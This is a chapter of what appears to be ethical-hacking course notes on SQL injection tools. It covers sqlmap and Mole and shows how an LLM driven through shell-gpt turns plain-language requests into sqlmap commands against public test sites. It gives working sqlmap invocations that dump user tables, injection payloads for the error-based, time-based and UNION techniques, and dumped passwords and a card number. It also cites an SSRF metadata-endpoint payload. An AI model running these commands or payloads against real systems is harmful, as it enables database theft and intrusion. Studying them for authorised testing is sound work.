# 06 — SQL Injection Tools & AI-Assisted Testing

SQL injection tools automate detection and exploitation at every stage of the attack — enumerating users, databases,
roles, columns, and tables far faster than manual injection.

## sqlmap

**Source:** `https://sqlmap.org`

An open-source penetration testing tool that automates detecting and exploiting SQLi flaws and taking over database
servers. Comes with a powerful detection engine, extensive database-fingerprinting features, data-fetching switches,
underlying file-system access, and OS command execution via out-of-band connections.

**Full technique support (all 6 SQLi types):**
- Boolean-based blind
- Time-based blind
- Error-based
- UNION query-based
- Stacked queries
- Out-of-band injection

**Key features:**
- Direct database connection (given DBMS credentials, IP, port, and database name) without going through the
  injection point at all
- Enumerate users, password hashes, privileges, roles, databases, tables, and columns
- Automatic recognition of password hash formats + dictionary-based cracking
- Dump entire tables, specific ranges of entries, or specific columns
- Search for specific database names, tables across all databases, or columns across all databases' tables
- Establish an out-of-band stateful TCP connection between the attacker's machine and the underlying OS of the
  database server

### Example Invocation

```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" \
  --cookie="mscope=1jWydNf8wro=; ui-tabs-1=0" \
  -D moviescope -T User_Login --dump
```

Sample output — dumping the `moviescope.dbo.User_Login` table (5 entries):

```
Database: moviescope
Table: User_Login
[5 entries]
+-----+-------+---------+----------+
| Uid | Uname | isAdmin | password |
+-----+-------+---------+----------+
| 1   | sam   | True    | test     |
| 2   | john  | True    | qwerty   |
| 3   | kety  | NULL    | apple    |
| 4   | steve | NULL    | password |
| 5   | lee   | NULL    | test     |
+-----+-------+---------+----------+
[INFO] table 'moviescope.dbo.User_Login' dumped to CSV file '/root/.local/share/sqlmap/output/www.moviescope.com/dump/moviescope/User_Login.csv'
```

## Mole

**Source:** `https://sourceforge.net`

An automatic SQLi exploitation tool — supply only a vulnerable URL and a valid string found on the page, and it
detects the injection and exploits it via the UNION technique or Boolean-based blind technique. Uses a
command-based CLI with auto-completion for both commands and arguments.

**Features:**
- Supports MySQL, PostgreSQL, SQL Server, and Oracle
- Automatic SQLi exploitation using the UNION technique
- Automatic blind SQLi exploitation
- Exploits SQLi in GET, POST, and Cookie parameters
- Supports filters to bypass certain IPS/IDS rules (generic filters, plus easy custom filter creation)
- Can exploit SQLi that returns binary data

## Other SQL Injection Tools

| Tool | Source |
|---|---|
| jSQL Injection | `https://github.com` |
| NoSQLMap | `https://github.com` |
| Havij | `https://github.com` |
| blind_sql_bitshifting | `https://github.com` / `https://sourceforge.net` |

---

## Discovering & Exploiting SQL Injection Vulnerabilities With AI

Attackers can leverage AI (e.g. ChatGPT, driven through a shell-gpt/`sgpt` CLI wrapper) to translate natural-language
intent directly into correct `sqlmap` invocations — dramatically lowering the skill barrier for exploitation. All
examples below target `http://testphp.vulnweb.com/listproducts.php?cat=1` (Acunetix's public test site, database
`acuart`).

### General Discovery Prompt

```bash
sudo sgpt --shell "Check for all possible SQL injection on target url http://testphp.vulnweb.com"
```

AI-generated command:

```bash
sqlmap -u "http://testphp.vulnweb.com" --batch --crawl=5 --random-agent --level=5 --risk=3
```

**Flag-by-flag breakdown:**

| Flag | Meaning |
|---|---|
| `sqlmap` | CLI tool automating SQLi discovery and exploitation |
| `-u "http://testphp.vulnweb.com"` | Target URL to test |
| `--batch` | Non-interactive mode; use default settings for every prompt |
| `--crawl=5` | Crawl up to 5 links deep from the target URL to find additional injection points |
| `--random-agent` | Random `User-Agent` per request, reducing detection chance |
| `--level=5` | Test thoroughness (1–5, higher = more thorough) |
| `--risk=3` | Test aggressiveness (1–3, higher = more aggressive/potentially disruptive) |

Confirmed environment from scan output: web server OS **Linux Ubuntu**, **PHP 5.6.40 + Nginx 1.19.0**, back-end DBMS
**MySQL >= 8.0.0**. Databases found: `acuart`, `information_schema`.

### Technique-Specific AI Workflows

Each of the four core techniques follows the same **escalating prompt chain** pattern — each new capability adds
another chained `sqlmap` flag: `--dbs` → `-D <db> --tables` → `-T <table> --columns` → `-C <cols> --dump`.

#### 1. Boolean-Based (`--technique=B`)

| Prompt | Generated command |
|---|---|
| "...enumerate the database" | `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --batch --technique-B --dbs` |
| "...enumerate the tables in acuart database" | `sqlmap -u "...cat=1" --batch --technique=B --dbs && sqlmap -u "...cat=1" --batch -D acuart --tables` |
| "...enumerate users table in acuart database" | *(adds)* `&& sqlmap -u "...cat=1" --batch -D acuart -T users --columns && sqlmap -u "...cat=1" --batch -D acuart -T users -C username,password --dump` |
| "...and dump the user database" | Full chain ending in `-D acuart -T users --dump` |

Found: `acuart.users` has 8 columns — `address (mediumtext)`, `cart`, `cc`, `email`, `name`, `pass`, `phone`, `uname`
(all `varchar(100)`).

#### 2. Error-Based (`--technique=E`)

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique-E --dbs && \
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables && \
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --columns && \
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users --dump
```

Confirmed injection point:

```
Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7178766b71,(SELECT ELT(5122=5122,1))),0x7170717671),5122
```

#### 3. Time-Based Blind (`--technique=T`)

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T --dbs
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T --dbs --tables -D acuart
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=T --dbs --tables -D acuart -T users --dump
```

Confirmed time-based blind payload:

```
Payload: cat=1 AND (SELECT 8889 FROM (SELECT(SLEEP(5)))tGAX)
```

`acuart` was found to have 8 tables: `artists`, `carts`, `categ`, `featured`, `guestbook`, `pictures`, `products`,
`users`.

#### 4. UNION-Based (`--technique=U`)

```bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --technique=U --dbs
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --risk=3 --level=5 --technique=U --dbs
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --risk=3 --level=5 --technique=U -D acuart --tables
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --risk=3 --level=5 --technique=U -D acuart -T users --columns
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --risk=3 --level=5 --technique=U -D acuart -T users --dump
```

Confirmed UNION injection point (11 columns):

```
Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716a7671,<random>,0x71706b7a71),NULL--
```

### Sample Dumped Data (all four techniques converge on the same target)

```
+------------------+----------------------------------+-------+------+-------------------------------------------+--------------+-------+---------+
| cc               | cart                               | name  | pass | email                                       | phone        | uname | address |
+------------------+----------------------------------+-------+------+-------------------------------------------+--------------+-------+---------+
| 4521653781873626 | 0c050378b44a064a3e18bac3421da408 | M.J.S | test | http://169.254.169.254/latest/meta-data/... | 0096892974349| test  | oman    |
+------------------+----------------------------------+-------+------+-------------------------------------------+--------------+-------+---------+
```

> Note the `email` field containing an SSRF-style payload (`169.254.169.254` is the cloud metadata endpoint) —
> a reminder that dumped "data" from a test target may itself contain other attack payloads planted by prior testers.

### Key Takeaway

Across all four techniques, natural-language prompts to an LLM can be translated directly into correctly-flagged
`sqlmap` commands, chaining `--dbs` → `--tables` → `--columns` → `--dump`. This meaningfully lowers the skill floor
required to run a full SQLi exploitation chain — which is exactly why understanding the underlying manual technique
(covered in files [03](03-methodology-information-gathering.md)–[05](05-methodology-advanced-sql-injection.md))
still matters for both attackers and defenders.

---

**Previous:** [05 — Methodology: Advanced SQL Injection](05-methodology-advanced-sql-injection.md) · **Next:** [07 — IDS / WAF Evasion Techniques](07-ids-waf-evasion-techniques.md)
